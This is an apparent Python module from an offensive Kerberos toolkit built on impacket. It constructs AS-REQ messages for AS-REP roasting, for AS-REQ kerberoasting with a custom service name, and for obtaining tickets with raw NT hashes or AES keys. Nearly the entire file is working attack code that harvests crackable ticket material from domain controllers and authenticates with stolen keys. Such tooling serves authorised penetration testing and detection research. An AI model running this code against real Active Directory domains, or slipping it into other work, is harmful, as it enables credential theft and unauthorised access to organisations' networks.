"""AS-REQ message builder with full encryption-type control.

Builds Kerberos AS-REQ messages for:
- TGT acquisition with pre-authentication (all etypes)
- AS-REP roasting (no pre-auth, configurable etype)
- AS-REQ kerberoasting (no pre-auth, custom sname for direct ST)
"""

from __future__ import annotations

import datetime
import logging
import secrets

from impacket.krb5 import constants as krb_constants
from impacket.krb5.asn1 import (
    AS_REP,
    AS_REQ,
    ETYPE_INFO2,
    KRB_ERROR,
    METHOD_DATA,
    PA_ENC_TS_ENC,
    EncASRepPart,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.asn1 import (
    EncryptedData as EncryptedDataAsn1,
)
from impacket.krb5.crypto import Key
from impacket.krb5.kerberosv5 import KERB_PA_PAC_REQUEST
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from kerbwolf.core.crypto import ENCTYPE_TABLE, compute_salt, derive_key, key_from_hex
from kerbwolf.core.transport import send_receive
from kerbwolf.models import EncryptionType, KDCError, KerberosCredential, TransportProtocol

_log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Low-level AS-REQ builder
# ---------------------------------------------------------------------------


def build_asreq(
    client: str,
    domain: str,
    *,
    etypes: tuple[int, ...],
    server: str | None = None,
    include_pac: bool = True,
    preauth_key: Key | None = None,
    preauth_etype: int | None = None,
) -> bytes:
    """Build an AS-REQ message with full control over every field.

    Args:
        client: Username (sAMAccountName).
        domain: Domain FQDN (will be uppercased for the realm).
        etypes: Tuple of etype integers for the req-body etype field.
        server: SPN for the sname field.  Defaults to ``krbtgt/REALM``.
        include_pac: Whether to include PA-PAC-REQUEST.
        preauth_key: If set, includes PA-ENC-TIMESTAMP encrypted with this key.
        preauth_etype: Etype int for the PA-ENC-TIMESTAMP EncryptedData.  Required when *preauth_key* is set.

    """
    realm = domain.upper()
    client_principal = Principal(client, type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)
    server_name = server or f"krbtgt/{realm}"
    server_principal = Principal(server_name, type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)

    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(krb_constants.ApplicationTagNumbers.AS_REQ.value)

    # -- padata ---------------------------------------------------------------
    padata_index = 0
    as_req["padata"] = noValue

    if preauth_key is not None and preauth_etype is not None:
        # PA-ENC-TIMESTAMP - encrypted timestamp for pre-authentication.
        now = datetime.datetime.now(datetime.UTC)
        enc_ts = PA_ENC_TS_ENC()
        enc_ts["patimestamp"] = KerberosTime.to_asn1(now)
        enc_ts["pausec"] = now.microsecond

        cipher_cls = ENCTYPE_TABLE[preauth_etype]
        enc_ts_encoded = encoder.encode(enc_ts)
        encrypted = cipher_cls.encrypt(preauth_key, 1, enc_ts_encoded, None)

        enc_data = EncryptedDataAsn1()
        enc_data["etype"] = preauth_etype
        enc_data["cipher"] = encrypted

        as_req["padata"][padata_index] = noValue
        as_req["padata"][padata_index]["padata-type"] = int(krb_constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
        as_req["padata"][padata_index]["padata-value"] = encoder.encode(enc_data)
        padata_index += 1

    if include_pac:
        pac_request = KERB_PA_PAC_REQUEST()
        pac_request["include-pac"] = True
        as_req["padata"][padata_index] = noValue
        as_req["padata"][padata_index]["padata-type"] = int(krb_constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        as_req["padata"][padata_index]["padata-value"] = encoder.encode(pac_request)

    # -- req-body -------------------------------------------------------------
    req_body = seq_set(as_req, "req-body")

    opts = [
        krb_constants.KDCOptions.forwardable.value,
        krb_constants.KDCOptions.renewable.value,
        krb_constants.KDCOptions.proxiable.value,
    ]
    req_body["kdc-options"] = krb_constants.encodeFlags(opts)

    seq_set(req_body, "cname", client_principal.components_to_asn1)
    seq_set(req_body, "sname", server_principal.components_to_asn1)
    req_body["realm"] = realm

    tomorrow = datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=1)
    req_body["till"] = KerberosTime.to_asn1(tomorrow)
    req_body["rtime"] = KerberosTime.to_asn1(tomorrow)
    req_body["nonce"] = secrets.randbits(31)

    seq_set_iter(req_body, "etype", etypes)

    return encoder.encode(as_req)


# ---------------------------------------------------------------------------
# High-level: request a TGT with pre-authentication
# ---------------------------------------------------------------------------


def request_tgt(
    cred: KerberosCredential,
    *,
    dc_ip: str,
    etype: EncryptionType,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
) -> tuple[bytes, Key, Key]:
    """Full TGT acquisition: salt retrieval, pre-auth, TGT extraction.

    Returns:
        ``(raw_asrep_bytes, client_key, session_key)``

    """
    realm = cred.domain.upper()
    etype_int = int(etype)

    # If we already have a raw key, use it directly.
    key = _resolve_key(cred, etype)

    if key is not None:
        _log.info("Auth: pre-computed %s key for %s", etype.name, cred.username)
        return _request_tgt_with_key(cred.username, realm, key, etype_int, dc_ip=dc_ip, transport=transport, timeout=timeout)

    # Password flow - may need salt retrieval first.
    if cred.password is None:
        msg = "No password or key provided"
        raise KDCError(error_code=0, message=msg)

    # For RC4, derive key without salt.
    if etype == EncryptionType.RC4_HMAC:
        _log.info("Auth: deriving RC4 key (MD4) for %s", cred.username)
        key = derive_key(etype, cred.password, "")
        return _request_tgt_with_key(cred.username, realm, key, etype_int, dc_ip=dc_ip, transport=transport, timeout=timeout)

    # AES / DES need salt - send bare AS-REQ to retrieve it.
    _log.info("Retrieving salt for %s (etype %d)", cred.username, etype_int)
    salt = _retrieve_salt(cred.username, realm, etype_int, dc_ip=dc_ip, transport=transport, timeout=timeout)
    _log.info("Salt: %s = %s", cred.username, salt)
    key = derive_key(etype, cred.password, salt)
    return _request_tgt_with_key(cred.username, realm, key, etype_int, dc_ip=dc_ip, transport=transport, timeout=timeout)


# ---------------------------------------------------------------------------
# High-level: AS-REP without pre-authentication
# ---------------------------------------------------------------------------


def request_asrep_no_preauth(
    username: str,
    domain: str,
    *,
    dc_ip: str,
    etypes: tuple[int, ...],
    server: str | None = None,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
) -> bytes:
    """Send an AS-REQ without pre-authentication data.

    Used for AS-REP roasting and AS-REQ kerberoasting (when *server*
    is set to a service SPN instead of krbtgt).

    Returns:
        Raw AS-REP bytes.

    """
    _log.debug("AS-REQ (no preauth) → %s for %s@%s sname=%s etypes=%s", dc_ip, username, domain.upper(), server or "krbtgt", etypes)
    message = build_asreq(username, domain, etypes=etypes, server=server)
    response = send_receive(message, dc_ip, protocol=transport, timeout=timeout)
    _check_krb_error_strict(response)
    return response


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _resolve_key(cred: KerberosCredential, etype: EncryptionType) -> Key | None:
    """Return a ``Key`` if the credential has a raw key for *etype*, else ``None``."""
    raw: bytes = b""
    if etype == EncryptionType.RC4_HMAC and cred.nthash:
        raw = cred.nthash
    elif etype == EncryptionType.AES128_CTS_HMAC_SHA1_96 and cred.aes128_key:
        raw = cred.aes128_key
    elif etype == EncryptionType.AES256_CTS_HMAC_SHA1_96 and cred.aes256_key:
        raw = cred.aes256_key
    elif etype.is_des and cred.des_key:
        raw = cred.des_key

    if raw:
        return key_from_hex(etype, raw.hex())
    return None


def _request_tgt_with_key(
    username: str,
    realm: str,
    key: Key,
    etype_int: int,
    *,
    dc_ip: str,
    transport: TransportProtocol,
    timeout: float = 10.0,
) -> tuple[bytes, Key, Key]:
    """Send a pre-authenticated AS-REQ and extract the session key from the AS-REP."""
    _log.debug("AS-REQ (pre-auth) → %s for %s@%s etype %d", dc_ip, username, realm, etype_int)
    message = build_asreq(
        username,
        realm,
        etypes=(etype_int,),
        preauth_key=key,
        preauth_etype=etype_int,
    )
    response = send_receive(message, dc_ip, protocol=transport, timeout=timeout)
    _check_krb_error(response)

    as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
    cipher_cls = ENCTYPE_TABLE[etype_int]
    plaintext = cipher_cls.decrypt(key, 3, as_rep["enc-part"]["cipher"])
    enc_part = decoder.decode(plaintext, asn1Spec=EncASRepPart())[0]
    session_key = Key(int(enc_part["key"]["keytype"]), enc_part["key"]["keyvalue"].asOctets())
    _log.debug("AS-REP ← TGT for %s@%s, session key etype %d", username, realm, session_key.enctype)

    return response, key, session_key


def _retrieve_salt(
    username: str,
    realm: str,
    etype_int: int,
    *,
    dc_ip: str,
    transport: TransportProtocol,
    timeout: float = 10.0,
) -> str:
    """Send a bare AS-REQ (no pre-auth) to trigger PREAUTH_REQUIRED and extract the salt."""
    message = build_asreq(username, realm, etypes=(etype_int,))
    response = send_receive(message, dc_ip, protocol=transport, timeout=timeout)

    try:
        krb_error = decoder.decode(response, asn1Spec=KRB_ERROR())[0]
    except Exception as exc:
        msg = "Unexpected response when retrieving salt"
        raise KDCError(error_code=0, message=msg) from exc

    error_code = int(krb_error["error-code"])
    if error_code != krb_constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
        msg = f"Expected PREAUTH_REQUIRED, got error {error_code}"
        raise KDCError(error_code=error_code, message=msg)

    # Parse e-data for salt.
    e_data = krb_error["e-data"].asOctets()
    method_data = decoder.decode(e_data, asn1Spec=METHOD_DATA())[0]

    for pa_data in method_data:
        pa_type = int(pa_data["padata-type"])
        if pa_type == krb_constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
            etype_info2 = decoder.decode(pa_data["padata-value"], asn1Spec=ETYPE_INFO2())[0]
            for entry in etype_info2:
                if int(entry["etype"]) == etype_int:
                    return str(entry["salt"])

    # Fallback: compute salt from username + realm.
    _log.debug("No salt in ETYPE-INFO2 for etype %d, using computed salt", etype_int)
    return compute_salt(username, realm)


def _check_krb_error(response: bytes) -> None:
    """Raise ``KDCError`` if *response* is a KRB_ERROR (except PREAUTH_REQUIRED).

    Used in the TGT acquisition flow where PREAUTH_REQUIRED is expected
    and handled separately via ``_retrieve_salt``.
    """
    try:
        krb_error = decoder.decode(response, asn1Spec=KRB_ERROR())[0]
        error_code = int(krb_error["error-code"])
        if error_code != krb_constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            _raise_kdc_error(error_code)
    except KDCError:
        raise
    except Exception:  # noqa: BLE001
        # Not a KRB_ERROR - this is an AS-REP or TGS-REP.

        _log.debug("Response is not a KRB_ERROR (normal for AS-REP/TGS-REP)")


def _check_krb_error_strict(response: bytes) -> None:
    """Raise ``KDCError`` if *response* is ANY KRB_ERROR, including PREAUTH_REQUIRED.

    Used in ``request_asrep_no_preauth`` where PREAUTH_REQUIRED means
    the account cannot be roasted (it requires pre-authentication).
    """
    try:
        krb_error = decoder.decode(response, asn1Spec=KRB_ERROR())[0]
        error_code = int(krb_error["error-code"])
        _raise_kdc_error(error_code)
    except KDCError:
        raise
    except Exception:  # noqa: BLE001
        _log.debug("Response is not a KRB_ERROR (normal for AS-REP/TGS-REP)")


def _raise_kdc_error(error_code: int) -> None:
    """Raise a ``KDCError`` with a human-readable error name."""
    error_name = "UNKNOWN"
    for e in krb_constants.ErrorCodes:
        if e.value == error_code:
            error_name = e.name
            break
    raise KDCError(error_code=error_code, message=f"KDC error: {error_name} ({error_code})")
